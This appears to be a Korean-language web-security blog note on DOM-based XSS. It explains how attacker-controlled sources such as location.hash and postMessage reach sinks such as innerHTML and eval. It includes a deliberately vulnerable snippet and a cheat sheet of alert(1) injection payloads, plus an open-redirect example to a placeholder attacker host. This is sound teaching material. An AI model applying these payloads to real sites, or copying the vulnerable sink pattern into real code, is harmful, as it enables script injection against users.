---
title: "DOM XSS (source와 sink)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, XSS]
tags: [xss, dom-xss, client-side, web]
description: "서버를 거치지 않고 클라이언트 JS가 location 값을 DOM sink로 흘려 실행되는 DOM XSS의 개념과, source→sink 추적·실행 구문을 정리합니다."
mermaid: true
---

> DOM XSS는 서버 응답이 아니라 **클라이언트 자바스크립트**가 공격자 제어 값(source)을 위험한 DOM 기능(sink)에 넘겨 실행되는 XSS다. 페이로드가 서버 로그에 안 남고 `#` 뒤에 있으면 서버로 전송조차 안 된다.

## 개념

흐름은 **source → (가공) → sink** 다. source는 `location.hash`·`location.search`·`document.referrer`·`postMessage` 등 공격자가 바꿀 수 있는 값이고, sink는 그 값을 코드/HTML로 해석하는 `innerHTML`·`document.write`·`eval`·`setTimeout` 등이다.

```javascript
let q = location.hash.slice(1);        // source: URL 조각(#...)
document.getElementById("out").innerHTML = q;   // sink: innerHTML → 실행
```

주요 sink: `innerHTML`/`outerHTML`, `document.write`, `eval`/`Function`, `setTimeout(str)`, `location`/`location.href`(javascript:), `el.src`/`el.href`, jQuery `$(...)`·`.html()`. `#` 뒤 값은 서버로 가지 않아 WAF·서버 필터가 못 본다.

## 공격·우회 구문

허가된 범위, 무해한 `alert(1)`로 증명한다.

### source → sink 추적

```
DevTools 에서 location.hash/search/referrer/name/postMessage 가 쓰이는 곳 검색
그 값이 innerHTML/document.write/eval/setTimeout/location 에 닿는지 따라감
브레이크포인트: sink 함수에 중단점 걸고 입력이 흘러오는지
```

### HTML sink 실행

```
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>
?q=<iframe src=javascript:alert(1)>
```

### JS 실행 sink

```
location = "javascript:alert(1)"
#';alert(1);//        (eval/Function 문맥)
setTimeout 문자열 인자에 닿으면: #alert(1)
```

### postMessage / 리다이렉트 source

```
악성 페이지에서: target.postMessage("<img src=x onerror=alert(1)>","*")
→ 수신측이 event.data 를 innerHTML 에 넣고 origin 검증이 없으면 실행
location.href = 제어 가능한 값 → //attacker.example 로 오픈 리다이렉트
```

## 참고 자료

- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
